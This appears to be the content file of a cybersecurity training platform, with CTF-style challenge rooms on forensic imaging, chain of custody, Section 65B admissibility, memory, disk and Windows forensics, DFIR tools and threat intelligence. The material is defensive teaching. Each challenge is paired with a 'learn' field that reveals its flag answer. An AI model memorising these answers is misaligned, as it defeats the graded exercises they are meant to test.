lab.intro: Image a drive with on-the-fly hashing.

steps.cmd: sudo dcfldd if=/dev/sdb of=evidence.dd hash=sha256 hashlog=evidence.sha256
steps.out:
512000+0 records in
512000+0 records out
sha256 (evidence.dd): 7b3f9c2e...a19c  <- image hash recorded

sugg: sudo dcfldd if=/dev/sdb of=evidence.dd hash=sha256 hashlog=evidence.sha256

steps2: Image the source device with dcfldd/FTK Imager, hashing as you go
Note the image is bit-for-bit, not a file copy
Name this forensic copy (one word).

tasks.title: Write blockers
tasks.teach: To guarantee you don't change the source while reading it, you use a write blocker — a hardware device (or software control) that sits between the evidence drive and your workstation and allows reads but blocks all writes. Without it, simply connecting a disk to Windows can modify it (the OS writes metadata, recycle-bin entries, etc.), tainting the evidence. The write blocker makes acquisition provably non-destructive.
tasks.chal: What device allows reading evidence media while blocking all writes to it? Submit TG{•••••_•••••••}.
tasks.learn: Write blocker — hardware or software, it makes 'we didn't change the original' provable. Always image through one.
tasks.example: Plug a suspect USB straight into Windows and it may write to it instantly. Through a write blocker, you read every byte and change none.

tasks.title: Hashing for integrity
tasks.teach: How do you prove the evidence hasn't changed? You compute a cryptographic hash (SHA-256) of the source and of the image at acquisition, and they match. Any later verification recomputes the hash — if it still matches, the evidence is provably unaltered; if a single bit changed, the hash changes completely. Hashing turns 'trust me' into mathematical proof of integrity.
tasks.chal:
$ sha256sum evidence.dd 7b3f9c2e...a19c evidence.dd # matches the acquisition hash -> unaltered # (any change, even 1 bit, would produce a totally different value)

What cryptographic fingerprint is used to prove evidence hasn't changed? Submit TG{••••}.
tasks.learn: Hash — compute at acquisition, re-verify any time. Matching SHA-256 values are mathematical proof the evidence is byte-identical to the source.
tasks.example: Acquisition hash and verification hash match → the defence can't claim the evidence was tampered with. That is why every image is hashed.

lab.intro: Verify an image still matches its acquisition hash.

steps.out: 7b3f9c2e4a...a19c  evidence.dd   <- matches acquisition hash = unaltered

steps2: Recompute the image hash with sha256sum
Compare it to the hash recorded at acquisition
Name this integrity fingerprint (4 letters).

tasks.title: Chain of custody
tasks.teach: Chain of custody is the documented, unbroken record of the evidence's life: who collected it, when, how, where it has been stored, and every person who handled it since — each handoff logged and signed. It answers 'can we trust this evidence came from where you say and wasn't tampered with?'. A gap in the chain can render evidence inadmissible, however good the analysis.
tasks.chal: What is the documented, unbroken record of everyone who handled the evidence called (three words)? Submit TG{•••••_••_•••••••}.
tasks.learn: Chain of custody — with hashing and sealed storage, it makes evidence trustworthy and admissible. Break the chain and the evidence may be worthless.
tasks.example: Form fields: item, hash, collected by/when, storage location, each transfer (from → to, date, signature). Unbroken = defensible; a gap = challengeable.

tasks.title: Admissibility & Indian law
tasks.teach: For evidence to be used in an Indian court it must be admissible — lawfully obtained, authentic, and properly certified. Electronic records are governed by the Information Technology Act and the Indian Evidence Act; crucially, Section 65B of the Evidence Act requires a certificate attesting how electronic evidence was produced for it to be admissible. Forensic discipline (imaging, hashing, custody) is what lets you provide that certification credibly.
tasks.chal: Which section of the Indian Evidence Act governs admissibility of electronic evidence (requires a certificate)? Submit TG{•••}.
tasks.learn: 65B — the Section 65B certificate authenticates electronic evidence for Indian courts. Your imaging, hashing and custody records are what back it up.
tasks.example: Even perfect technical work fails in court without the 65B certificate — forensics and the legal paperwork go hand in hand.

tasks.title: Scenario: preserve, prove, present
tasks.teach: A laptop is seized. You capture RAM first (order of volatility), image the disk through a write blocker, hash everything, log the chain of custody, analyse the image (never the original), and write a reproducible report backed by a Section 65B certificate. Every step served one goal: that the evidence, and your conclusions, hold up to challenge. Evidence that can be lawfully used in court is said to be ___.
tasks.chal: What is evidence that is lawfully obtained, authentic and usable in court called? Submit TG{••••••••••}.
hints: It can be accepted by the court.
tasks.learn: Admissible — the whole point of forensic discipline. Preserve (don't change it), prove (hashing + custody), present (a defensible, certified report) → admissible evidence.
tasks.example: Mishandle any step — no write blocker, a custody gap, no hash — and brilliant analysis becomes inadmissible. Process protects the evidence.

rooms.title: Forensic Domains
rooms.subtitle: Disk, Memory, Windows, Network, Browser — evidence wherever it lives.
rooms.blurb: Work the five forensic domains — recover from disk, analyse RAM, read Windows artefacts, captures and browsers — into one timeline.

tasks.title: The five domains
tasks.teach:
Evidence of what happened on a computer does not live in one place — it is scattered across five forensic domains, each revealing part of the story: Disk (files, deleted data, slack), Memory (running processes, injected code, keys, network state), Windows artefacts (registry, event logs, prefetch, USB/LNK), Network (captures and flows), and Browser (history, cache, downloads). The investigator's job is to gather evidence from each and correlate it into one timeline of the event.

Why it matters: any single domain is a partial view. Disk shows a file existed; memory shows it ran; Windows artefacts show when and how often; network shows where it called home; browser shows how it arrived. Together they tell the whole story.
tasks.chal: What do you build by correlating evidence from all five domains into one ordered account of events? Submit TG{••••••••}.
tasks.learn: Timeline — the goal. Each domain contributes timestamped events; merged and ordered, they reconstruct exactly what happened, when.
tasks.example: Browser (download at 09:02) → Disk (file written 09:02) → Prefetch (it ran 09:03) → Memory (process + C2 socket) → Network (beacon to 93.184.x.x). One timeline.

tasks.title: Disk forensics & carving
tasks.teach: Deleting a file usually just removes its filesystem pointer — the data stays on disk until overwritten. Disk forensics recovers it. When the filesystem metadata is gone entirely, you use file carving: scanning the raw bytes for known file signatures (headers/footers — a JPEG starts FF D8 FF, a PDF %PDF) and reconstructing files from the content alone, independent of the filesystem.
tasks.chal:
$ foremost -t jpg,pdf,doc -i evidence.dd -o recovered/ Processing: evidence.dd jpg:= 48 pdf:= 12 doc:= 5 <- files carved from raw bytes (incl. deleted)

What is recovering files from raw bytes by their signatures (no filesystem) called? Submit TG{•••••••}.
tasks.learn: Carving — recovers deleted/unallocated data by content signature. Tools like foremost/scalpel/PhotoRec carve files the filesystem no longer indexes.
tasks.example: A suspect emptied the recycle bin and formatted — carving still pulls the deleted JPEGs and PDFs straight out of the unallocated bytes.

lab.intro: Carve deleted files from a raw image by signature.

steps.out:
jpg:= 48   pdf:= 12   (carved from unallocated space, incl. deleted)
see recovered/audit.txt

steps2: Run foremost -t jpg,pdf -i image.dd -o out/
Review files recovered from unallocated/deleted space
Name this signature-based recovery.

tasks.title: Slack space
tasks.teach: Disks store data in fixed-size clusters. When a file doesn't fill its last cluster, the leftover area is slack space — and it often still contains fragments of whatever was there before. Investigators examine slack space because it can hold remnants of deleted files, old data, or even data an attacker hid there. It is one of those 'empty' areas a bit-for-bit image captures but a file copy misses.
tasks.chal: What is the unused leftover area at the end of a file's last cluster (which may hold old data) called? Submit TG{•••••_•••••}.
hints: The gap after the file in its cluster.
tasks.learn: Slack space — remnants of prior data (or hidden data) live here. Only a forensic image captures it; it is a classic place to find fragments of 'deleted' evidence.
tasks.example: A 10 KB file in a 32 KB cluster leaves 22 KB of slack — which might still hold part of the confidential document that occupied the cluster before.

tasks.title: Memory forensics
tasks.teach: Memory (RAM) forensics analyses a memory capture to reveal what disk can't: running processes and their lineage, injected/hidden code, credentials and encryption keys in cleartext, open network connections, and fileless malware that never touched disk. The standard tool is Volatility, which parses a RAM image with plugins (process list, network connections, injected code). Memory is often where the live truth of an intrusion is found.
tasks.chal: Name the standard open-source framework for analysing a RAM/memory image. Submit TG{••••••••••}.
tasks.learn: Volatility — the memory forensics workhorse. Its plugins expose processes, injected code, credentials and network state from a RAM capture.
tasks.example: Fileless malware lives only in RAM — invisible to disk forensics. Volatility on a memory image finds the hidden process, its injected code and its C2 socket.

tasks.title: Why RAM matters
tasks.teach: Memory holds evidence that exists nowhere else: decrypted data (the plaintext of files that are encrypted on disk), credentials and session tokens, encryption keys (including ransomware keys), the full process tree, and live network connections. Because it vanishes at power-off, capturing RAM is the highest-priority volatile acquisition — and often the difference between solving a case and missing the live malware entirely.
tasks.chal: Which volatile store holds decrypted data, keys and live connections that disk forensics can't recover? Submit TG{•••}.
tasks.learn: RAM — decrypted data, keys, tokens, live sockets, fileless malware. Capture it first; it's gone the moment the machine powers off.
tasks.example: A disk encrypted with BitLocker is unreadable — but the decryption key sits in RAM while the machine runs. Capture memory and you may recover it.

tasks.title: Windows artefacts: Prefetch
tasks.teach: Windows leaves a trail of artefacts that prove what happened even when files are deleted. A key one is Prefetch (C:\Windows\Prefetch\*.pf): Windows creates a prefetch file the first time a program runs, recording the executable name, run count, and last-run timestamps. So Prefetch can prove a program executed — and how often and when — even if the program itself is long gone. Others: registry, event logs, Amcache/Shimcache, LNK files and USB history.
tasks.chal:
C:\Windows\Prefetch\MIMIKATZ.EXE-A1B2C3D4.pf Run count: 3 Last run: 2026-10-30 09:41 First run: 2026-10-28 -> proves mimikatz.exe executed, 3 times, with timestamps

Which Windows artefact proves a program executed, with run count and timestamps? Submit TG{••••••••}.
tasks.learn: Prefetch — execution evidence that survives the program's deletion. Run count and timestamps place the activity on your timeline.
tasks.example: The malware was deleted, but MIMIKATZ.EXE-....pf remains — proof it ran three times, with exact timestamps for the timeline.

lab.intro: Read execution evidence from Prefetch.

steps.out:
MIMIKATZ.EXE-A1B2C3D4.pf  RunCount:3  LastRun:2026-10-30 09:41
NMAP.EXE-....pf             RunCount:1  LastRun:2026-10-30 09:05

steps2: Parse Prefetch (e.g. with PECmd)
Read the program name, run count and last-run time
Name this execution artefact.

tasks.title: The registry as evidence
tasks.teach: The Windows registry is a hierarchical database of configuration — and a treasure trove of forensic evidence. It records USB devices ever connected, recently-run programs (UserAssist, Shimcache/Amcache), typed paths, autostart/persistence locations, network profiles, and user activity. Tools like RegRipper extract these. The registry often answers 'what was installed, run, connected or configured, and when'.
tasks.chal: What Windows hierarchical configuration database is a rich forensic evidence source (USB history, run programs, persistence)? Submit TG{••••••••}.
tasks.learn: Registry — persistence, execution, device and user-activity evidence. RegRipper and Autopsy parse the hives into readable artefacts.
tasks.example: The USBSTOR key shows every USB drive ever plugged in (vendor, serial, first/last connected) — key evidence in a data-theft case.

tasks.title: Network forensics
tasks.teach: Network forensics analyses captured traffic to reconstruct communications: what connected to what, the content of cleartext sessions, exfiltration, and C2. The core evidence is the pcap (packet capture) file, analysed in Wireshark/tshark, plus flow records (NetFlow) for the bigger picture. It answers 'where did the data go, and what was said on the wire'.
tasks.chal: What is the packet-capture file format analysed in network forensics? Submit TG{••••}.
tasks.learn: pcap — the packet capture. In Wireshark you follow streams, extract files, and prove exfiltration or C2 from the bytes on the wire.
tasks.example: A pcap shows the beacon to 93.184.x.x and a 12 MB upload — the network-domain evidence that ties the host's activity to data exfiltration.

tasks.title: Browser forensics
tasks.teach: Browser forensics recovers what a user did on the web: history (sites and times visited), downloads, cache, cookies, saved form data and search terms — stored in the browser's SQLite databases. It often establishes intent and the entry point of an attack (the phishing link clicked, the malicious download) and places user activity precisely on the timeline.
tasks.chal: Which browser artefact lists the sites and times a user visited? Submit TG{•••••••}.
tasks.learn: History — sites, times and visit counts (in SQLite DBs). With downloads and cache, it shows how an attack arrived and what the user did.
tasks.example: Browser history at 09:01 shows a visit to a phishing page, then a download at 09:02 — the entry point, timestamped for the timeline.

tasks.title: Scenario: one timeline from five domains
tasks.teach: You work a compromised workstation across every domain: browser (phishing visit, then a download), disk (the dropped file, plus carved deleted copies), Windows (Prefetch proves it ran; registry shows persistence and a USB), memory (the live process, injected code and C2 socket), and network (the pcap of the beacon and exfil). Merging every timestamped artefact into one account — correlation across domains — is what turns scattered clues into a provable story.
tasks.chal: What is the cross-domain merging of all timestamped artefacts into one account called? Submit TG{•••••••••••}.
tasks.learn: Correlation — no single domain tells the whole story; correlating all five into one timeline does. That reconstruction is the investigation's deliverable.
tasks.example: Browser→disk→prefetch→memory→network, timestamps aligned: 'at 09:01 the user clicked X, at 09:02 downloaded Y, at 09:03 it ran, at 09:04 it beaconed.' Case made.

rooms.title: Forensic Tools
rooms.subtitle: FTK Imager, KAPE, Autopsy, Volatility — the practical DFIR toolkit.
rooms.blurb: Acquire with FTK Imager, triage fast with KAPE, analyse disks in Autopsy and memory in Volatility — chained into one workflow.

tasks.title: The DFIR toolkit & workflow
tasks.teach: Real investigations chain four tools into one workflow: FTK Imager to acquire (image disk and memory with hashing), KAPE to triage fast (grab the key artefacts quickly when you can't image everything), Autopsy to analyse the disk image, and Volatility to analyse memory. The discipline is to acquire defensibly first, then analyse — and to know which tool answers which question. Acquisition comes first, and the go-to free acquisition tool is FTK Imager.
tasks.chal: Which tool is the standard first step — acquiring a disk/memory image with hashing? Submit TG{•••_••••••}.
tasks.learn: FTK Imager — the acquisition workhorse. Workflow: FTK Imager (acquire) → KAPE (triage) → Autopsy (disk) → Volatility (memory).
tasks.example: Right tool, right question: disk image → Autopsy; RAM image → Volatility; 'grab the key artefacts now' → KAPE; 'make the images' → FTK Imager.

tasks.title: FTK Imager — acquisition
tasks.teach: FTK Imager (free) creates forensic images of disks and memory, computes and verifies hashes (MD5/SHA-256) during acquisition, and lets you preview and export files without altering the source. Its core job is imaging — producing the verified, defensible copy everything downstream relies on. It outputs standard formats (RAW/dd, E01) that Autopsy and others ingest.
tasks.chal:
FTK Imager > Create Disk Image > Source /dev/sdb > E01 Verifying... Image SHA256: 7b3f...a19c Source SHA256: 7b3f...a19c MATCH

What is FTK Imager's core forensic function (producing a verified copy)? Submit TG{•••••••}.
tasks.learn: Imaging — acquire + verify by hash. FTK Imager also captures RAM and previews files read-only. Its output feeds the rest of the workflow.
tasks.example: Source and image hashes MATCH on acquisition → the copy is provably identical, and you analyse it instead of the original.

lab.intro: Acquire and verify an image (FTK Imager / CLI equivalent).

steps.out:
Creating image evidence.E01 ...
Image  SHA256: 7b3f...a19c
Source SHA256: 7b3f...a19c   -> VERIFIED (match)

steps2: Create a disk/memory image in FTK Imager with hashing on
Confirm the image hash matches the source (VERIFIED)
Name FTK Imager's core function.

tasks.title: KAPE — fast triage
tasks.teach: Imaging a 2 TB disk takes hours; often you need answers now. KAPE (Kroll Artifact Parser and Extractor) does fast triage: using Targets it collects just the high-value artefacts (event logs, registry, Prefetch, browser data, MFT) in minutes, and using Modules it parses them with the right tools. It is how you get a quick, defensible read on a live or large system without a full image — the same philosophy as a read-only triage script.
tasks.chal: Which tool does fast, targeted artefact collection (Targets/Modules) for rapid triage? Submit TG{••••}.
tasks.learn: KAPE — collect the key artefacts in minutes, parse them with modules. Perfect when a full image is impractical or you need a fast first read.
tasks.example: KAPE Target '!SANS_Triage' grabs logs, registry, Prefetch, MFT and browser data in a couple of minutes — a triage image without imaging the whole disk.

tasks.title: Autopsy — disk analysis
tasks.teach: Autopsy (the GUI front-end to The Sleuth Kit, open-source) analyses a disk image: it ingests the image, runs modules that recover deleted files, build a timeline, do keyword search, extract web/registry artefacts, flag known-bad hashes, and produce a report. It is the friendly, powerful workbench for the disk domain — where you turn a raw image into findings.
tasks.chal: Name the open-source GUI disk-analysis tool (front-end to The Sleuth Kit). Submit TG{•••••••}.
tasks.learn: Autopsy — ingest an image, recover deleted files, keyword-search, build a timeline and report. The open-source disk-analysis workbench.
tasks.example: Load evidence.E01 into Autopsy → run ingest → it surfaces deleted files, web history, a keyword hit on 'password', and a timeline — all in one UI.

lab.intro: Ingest an image and find deleted files / keyword hits.

steps.out:
Files Recovered: 231 (deleted/allocated)
 -> recovered/ now holds carved & deleted files for review

sugg: (or load the image in the Autopsy GUI)

steps2: Create a case in Autopsy and add the disk image
Run ingest; review deleted files, timeline and keyword hits
Name this disk-analysis tool.

tasks.title: Volatility — list processes
tasks.teach: Volatility analyses a memory image through plugins. The first one you run is pslist (and pstree) — it lists the running processes from the RAM capture, with PIDs, parents and start times. From there you spot the suspicious process (wrong parent, odd name, hidden) to investigate further. Memory analysis starts with 'what was running?'.
tasks.chal:
$ vol.py -f mem.raw windows.pslist PID PPID ImageFileName 624 612 explorer.exe 2104 624 powershell.exe 3320 2104 rundll32.exe <- odd child of PowerShell? investigate

Which Volatility plugin lists the running processes from a memory image? Submit TG{••••••}.
tasks.learn: pslist (and pstree) — the starting point of memory analysis. Odd lineage or hidden processes point you to the next plugin.
tasks.example: rundll32.exe parented by powershell.exe is suspicious lineage — pslist/pstree surface it; malfind then checks it for injected code.

lab.intro: List processes from a RAM capture with Volatility.

steps.out:
PID   PPID  ImageFileName
624   612   explorer.exe
2104  624   powershell.exe
3320  2104  rundll32.exe   <- suspicious child

steps2: Run vol.py -f mem.raw windows.pslist (or pstree)
Look for odd lineage / hidden processes
Name the process-listing plugin.

tasks.title: Volatility — find injected code
tasks.teach: After listing processes, you hunt for injected or hidden code with the malfind plugin. It scans process memory for regions that are executable but not backed by a file on disk (a classic injection signature — e.g. RWX private memory containing shellcode). malfind is how you catch process injection and fileless malware that pslist shows as a normal process.
tasks.chal: Which Volatility plugin detects injected/hidden code in process memory? Submit TG{•••••••}.
tasks.learn: malfind — surfaces RWX private regions and shellcode (injection). It finds the malicious code hiding inside an otherwise-normal-looking process.
tasks.example: pslist shows svchost.exe as normal; malfind reveals an RWX region full of shellcode injected into it — the real threat, exposed.

tasks.title: Volatility — network connections
tasks.teach: Memory also holds the system's network state at capture time. The netscan plugin lists TCP/UDP connections and listeners found in RAM — including the C2 connection a malicious process had open. It ties a suspicious process (from pslist/malfind) to the external IP it was talking to, corroborating the network-domain pcap.
tasks.chal:
$ vol.py -f mem.raw windows.netscan Proto LocalAddr ForeignAddr State PID TCP 10.10.10.21:50519 93.184.x.x:443 ESTABLISHED 3320 <- C2 from rundll32

Which Volatility plugin lists network connections/listeners from a memory image? Submit TG{•••••••}.
tasks.learn: netscan — the connections in RAM, mapped to PIDs. It links the injected process to its C2, matching the network capture.
tasks.example: netscan shows PID 3320 (the malfind hit) connected to 93.184.x.x:443 — memory and network domains corroborate the same C2.

tasks.title: Open-source vs commercial
tasks.teach: Much of the best DFIR tooling is open source and free: Autopsy/Sleuth Kit (disk), Volatility (memory), KAPE (free for use), Wireshark (network), plaso/log2timeline (super-timelines). Commercial suites (FTK, EnCase, Magnet AXIOM) add polish, support and court-tested reporting. For learning and most work, the open-source stack is complete and powerful — which is why this toolkit is built around it.
tasks.chal: Autopsy, Volatility and Wireshark are examples of which category of DFIR tooling (two words)? Submit TG{••••_••••••}.
tasks.learn: Open source — a complete, free DFIR stack. Commercial tools (FTK, EnCase, AXIOM) add support and polish, but the open stack does the real work.
tasks.example: A full investigation — FTK Imager (free) + KAPE + Autopsy + Volatility + Wireshark — costs nothing in licences and is entirely defensible.

tasks.title: Chain the tools
tasks.teach: No single tool solves a case — the skill is chaining them into one workflow: acquire (FTK Imager images disk + RAM, hashed) → triage (KAPE pulls key artefacts fast) → analyse disk (Autopsy: deleted files, keyword, timeline) → analyse memory (Volatility: pslist → malfind → netscan) → correlate into one timeline. Each tool's output feeds the next, and every step is hashed and logged so the whole chain stays defensible.
tasks.chal: What is the end-to-end chaining of acquire → triage → disk → memory → correlate called? Submit TG{••••••••}.
tasks.learn: Workflow — the discipline that turns four tools into one investigation. Acquire first, analyse on copies, correlate, document throughout.
tasks.example: FTK Imager → KAPE → Autopsy → Volatility, each feeding the next, with hashes and custody at every handoff — a repeatable, defensible chain.

tasks.title: Scenario: running machine to defensible answer
tasks.teach: A live, possibly-compromised machine. You FTK Imager its RAM and disk (hashed), KAPE-triage the key artefacts for a fast read, analyse the disk in Autopsy (deleted files, timeline, keyword hits), and the memory in Volatility (pslist → malfind → netscan reveal injected code beaconing to C2). You chain every finding, with hashes and custody, into one deliverable the organisation and a court can rely on.
tasks.chal: What is the final deliverable that ties the whole tool-chained investigation together defensibly? Submit TG{••••••}.
tasks.learn: Report — the chained workflow (acquire → triage → disk → memory) exists to produce one clear, reproducible, defensible report. Tools find facts; the report presents them.
tasks.example: Image → triage → Autopsy → Volatility → correlated timeline → report with hashes, method and custody. That is an investigation that holds up.

rooms.title: Threat Intelligence Foundations
rooms.subtitle: Lifecycle, intel types, indicators, ATT&CK and adversaries.
rooms.blurb: Run the intelligence cycle, produce the right intel type, use IOCs and the Pyramid of Pain, and reason about attribution.

tasks.title: What CTI is — data to intelligence
tasks.teach:
Cyber Threat Intelligence (CTI) is knowledge about threats that is analysed and actionable — it helps someone make a decision. The key distinction is a ladder: raw data (a log line, an IP) becomes information when given context, and becomes intelligence only when it is analysed, evaluated, and tied to a decision. A list of 10,000 IPs is data; 'this IP belongs to an actor targeting your sector, block it' is intelligence.

Why it matters: CTI exists to serve decisions, not to collect indicators. Good intelligence is requirements-driven (it answers a real question someone asked), actionable, and delivered to the right audience in a form they can use.
tasks.chal: Analysed, contextualised, decision-ready knowledge about threats is called ___? Submit TG{••••••••••••}.
hints: Not raw data — the analysed product.
tasks.learn: Intelligence — data + context + analysis, tied to a decision. If it doesn't help someone decide or act, it isn't intelligence yet.
tasks.example: Data: 185.23.44.9. Information: 'a C2 IP seen last week'. Intelligence: 'C2 for an actor hitting Indian govt; block it and hunt these TTPs'.

tasks.title: The intelligence lifecycle
tasks.teach: CTI is produced through a repeatable cycle: Direction (set the requirements — what do we need to know?) → Collection (gather relevant data) → Processing (normalise, translate, deduplicate) → Analysis (turn it into intelligence) → Dissemination (deliver it to the audience) → Feedback (did it help? refine). It starts with Direction because intelligence without a requirement is just collection for its own sake.
tasks.chal: Which first stage of the intelligence cycle sets the requirements — what we need to know? Submit TG{•••••••••}.
tasks.learn: Direction — requirements first. The cycle (Direction → Collection → Processing → Analysis → Dissemination → Feedback) keeps intel tied to real needs.
tasks.example: Direction: 'which ransomware actors target our sector, and how?' Everything downstream collects and analyses to answer that, not everything.

tasks.title: The four types of intel
tasks.teach: Intelligence comes in four types, each for a different audience. Strategic — high-level threat and business-risk picture, for executives/the board. Operational — details of specific campaigns and actors, for defenders and managers. Tactical — the TTPs and behaviours, for the SOC and detection engineers. Technical — the raw indicators (hashes, IPs, domains), for tools and automation. Producing the right type for the audience is the skill.
tasks.chal: Which intel type gives executives/the board the business-risk picture? Submit TG{•••••••••}.
hints: For the boardroom, in risk terms.
tasks.learn: Strategic — threats framed as business risk, for leadership. Tactical is TTPs for the SOC; technical is the raw IOCs for tools.
tasks.example: Same incident, four products: a board risk note (strategic), a campaign writeup (operational), ATT&CK TTPs (tactical), and an IOC list (technical).

tasks.title: Indicators of Compromise
tasks.teach: The most concrete intel is the IOC (Indicator of Compromise) — an observable sign that an intrusion happened or is happening: a file hash, an IP, a domain, a URL, a registry key, a mutex. IOCs are easy to share and match automatically (block this IP, alert on this hash), which makes them the workhorse of technical intelligence — but also the most perishable, because attackers change them easily.
tasks.chal: What is an observable sign of an intrusion (hash, IP, domain) called? Submit TG{•••}.
tasks.learn: IOC — concrete, matchable, shareable… and perishable. Great for fast blocking, weak as long-term defence (attackers swap them cheaply).
tasks.example: IOC feed → SIEM/EDR auto-matches → instant detection of that exact hash/IP. But a new build changes the hash, so IOCs alone always lag the attacker.

lab.intro: Check a file hash against threat intelligence.

steps.out:
4f2a9c...e91c  detections: 58/70
names: Trojan.Ransom.X  first_seen: 2026-10-27  -> known-bad IOC

steps2: Look up the file hash on VirusTotal (or a TI source)
A high detection ratio = a known-bad indicator
Name this observable sign of compromise (3 letters).

tasks.title: TTPs
tasks.teach: Deeper than indicators are TTPs — Tactics, Techniques and Procedures — how an actor actually operates: the tactic (the goal, e.g. credential access), the technique (the method, e.g. LSASS dumping), the procedure (the specific way they do it). TTPs describe behaviour, not artefacts, so they stay true even when the attacker changes tools — which is why intelligence that captures an actor's TTPs is far more durable than a list of IOCs.
tasks.chal: What describes how an actor operates — Tactics, Techniques and Procedures? Submit TG{•••}.
tasks.learn: TTP — the actor's behaviour. Durable intelligence: tools change, but how a group operates changes slowly and expensively.
tasks.example: IOC: 'this hash'. TTP: 'spear-phish with a macro doc → PowerShell cradle → LSASS dump → PsExec lateral'. The TTP catches them even with new files.

tasks.title: The Pyramid of Pain
tasks.teach: The Pyramid of Pain ranks indicators by how much it hurts the adversary when you detect on them. Bottom (trivial to change): hash values, IPs, domains. Middle: network/host artefacts, tools. Top (very painful): TTPs. Detecting on hashes annoys the attacker for seconds; detecting their TTPs forces them to re-learn how they operate. CTI aims to push defence up the pyramid.
tasks.chal: At the top of the Pyramid of Pain — detection here hurts the adversary most — sit the ___? Submit TG{••••}.
tasks.learn: TTPs — the apex. Block a hash, they recompile; detect a technique, they must change how they work. CTI's goal is TTP-level defence.
tasks.example: Pyramid bottom→top: hash → IP → domain → network/host artefact → tool → TTP. Pain to the attacker increases all the way up.

tasks.title: MITRE ATT&CK
tasks.teach: MITRE ATT&CK is the framework that has become the common language of adversary behaviour — a curated matrix of real-world tactics (the columns: the attacker's goals) and techniques (how they achieve them), each with an ID (e.g. T1059 Command Shell). CTI uses it to describe actor TTPs consistently, map detection coverage, and let teams worldwide talk about attacker behaviour in the same terms.
tasks.chal: Name the framework that is the common language for adversary tactics and techniques. Submit TG{•••••_••••••}.
tasks.learn: MITRE ATT&CK — the shared vocabulary for TTPs. Describe an actor in ATT&CK technique IDs and any team anywhere understands exactly what they do.
tasks.example: 'The actor uses T1566 (Phishing), T1059.001 (PowerShell), T1003.001 (LSASS)' — precise, shareable, and maps straight to detections and gaps.

tasks.title: Models: Kill Chain & Diamond
tasks.teach: Two more models structure analysis. The Cyber Kill Chain (Lockheed Martin) breaks an attack into stages (recon → weaponise → deliver → exploit → install → C2 → actions) — useful for seeing where you can break the chain. The Diamond Model analyses any intrusion event as four linked vertices: Adversary, Capability, Infrastructure, Victim — pivot from any one to discover the others (an IP leads to the malware, which leads to the actor).
tasks.chal: Which model analyses an intrusion as Adversary–Capability–Infrastructure–Victim, letting you pivot between them? Submit TG{•••••••_•••••}.
tasks.learn: Diamond Model — pivot across adversary/capability/infrastructure/victim to expand what you know. The Kill Chain maps the attack's stages.
tasks.example: Diamond pivot: a victim's C2 IP (infrastructure) → the malware it serves (capability) → other victims of that malware → the actor (adversary).

tasks.title: Actors, APTs & attribution
tasks.teach: Threats come from actors with different motivations — cybercriminals (money), hacktivists (ideology), insiders, and APTs (Advanced Persistent Threats), typically well-resourced, often state-sponsored groups that pursue long-term objectives. Naming them is messy (vendors each coin names). Attribution — judging who is responsible — is hard and must always carry a confidence level; attackers plant false flags, and jumping to a confident name is a classic trap.
tasks.chal: What is the act of judging who is responsible for an attack (always stated with a confidence level)? Submit TG{•••••••••••}.
tasks.learn: Attribution — always hedged with confidence. False flags and shared tooling make it hard; a confident wrong name is worse than an honest 'medium confidence'.
tasks.example: Say 'likely APT-X (medium confidence) based on TTP overlap', not 'it was APT-X'. Attribution without confidence is opinion, not intelligence.

tasks.title: Scenario: write the product
tasks.teach: You've analysed a campaign. Now you write it up — and the mark of a professional intelligence product is analytic rigour: state your sources, flag assumptions, consider competing hypotheses (ACH), guard against bias (confirmation bias, mirroring), and — critically — attach a confidence level to every judgement so the reader knows how much to rely on it. Intelligence without stated confidence and sourcing is just assertion.
tasks.chal: What must every intelligence judgement carry so the reader knows how much to trust it? Submit TG{••••••••••}.
tasks.learn: Confidence — with sourcing and competing-hypotheses analysis, it is what separates intelligence from guesswork. Always say how sure you are, and why.
tasks.example: 'High confidence (multiple independent sources) the C2 is actor X; low confidence on the initial vector (single, unverified report).' Honest, usable, rigorous.

rooms.title: Threat Intelligence Operations
rooms.subtitle: Collect, share, enrich, act — OSINT, STIX/TAXII, MISP and the SOC.
rooms.blurb: Collect from OSINT and feeds, share with STIX/TAXII/TLP and MISP, and operationalise intel into SIEM, SOAR, EDR and hunting.

tasks.title: From analysis to action
tasks.teach:
Foundations produce intelligence; operations put it to work. The operational loop is Collect → Share → Enrich → Act: gather intel (OSINT, feeds, telemetry), share it in standard formats, use it to enrich your detection, and act on it (block, hunt, alert). The whole point is to operationalise intelligence — to feed it into the SIEM, SOAR, EDR and threat hunting so it actually changes what your defences catch, rather than sitting in a report.

Why it matters: intelligence that never reaches a control is wasted. CTI operations is the plumbing that turns 'we know about this threat' into 'our tools now detect and block it'.
tasks.chal: What is the act of putting intelligence to work in your security controls called? Submit TG{••••••••••••••}.
tasks.learn: Operationalise — intel that doesn't reach a SIEM/SOAR/EDR/hunt is just reading. The loop is Collect → Share → Enrich → Act.
tasks.example: A great campaign report that nobody turns into detections changed nothing. Operationalising = those TTPs become rules and those IOCs become blocks.

tasks.title: OSINT
tasks.teach: Much intelligence comes from OSINT (Open-Source Intelligence) — publicly available sources: WHOIS, DNS and passive DNS, certificate transparency, VirusTotal, Shodan, security vendor blogs, social media, and (carefully) the deep and dark web. The discipline is passive and safe collection — observe without touching the adversary's infrastructure in ways that tip them off or cross legal lines (in India, within the IT Act, 2000).
tasks.chal:
$ whois evil-c2.top | grep -Ei "created|registrar" Created: 2026-10-28 Registrar: BadReg LLC <- registered 2 days before the attack $ (passive DNS) evil-c2.top -> 185.23.44.9, 185.23.44.10

What is intelligence gathered from publicly available sources called? Submit TG{•••••}.
tasks.learn: OSINT — WHOIS, passive DNS, cert transparency, VT, Shodan, blogs. Collect passively and lawfully; don't poke the adversary's live infrastructure.
tasks.example: A domain registered two days before an attack, resolving to the C2 IP range — pure OSINT (WHOIS + passive DNS) that enriches the indicator.

lab.intro: Enrich an indicator with passive OSINT.

steps.out:
Creation Date: 2026-10-28
Registrar: BadReg LLC
Name Server: ns1.badreg.top   <- newly registered, suspicious

steps2: Look up the indicator with WHOIS / passive DNS / VT (passively)
Note registration age, registrar and resolved IPs
Name this open-source collection discipline.

tasks.title: Requirements-driven collection
tasks.teach: You don't collect everything — you collect against a PIR (Priority Intelligence Requirement): a specific, prioritised question leadership needs answered ('are ransomware actors targeting Indian government networks, and how?'). Each PIR drives what sources you collect from and what you analyse. Requirements keep collection focused and prevent the classic failure of drowning in feeds that answer no one's question.
tasks.chal: What is a specific, prioritised intelligence question that drives collection called (abbr.)? Submit TG{•••}.
tasks.learn: PIR — Priority Intelligence Requirement. Collection and analysis serve the PIRs; without them you over-collect noise that answers nothing.
tasks.example: PIR: 'which actors target our sector and what are their TTPs?' → collect sector reports + relevant feeds → analyse → brief leadership. Focused, not boil-the-ocean.

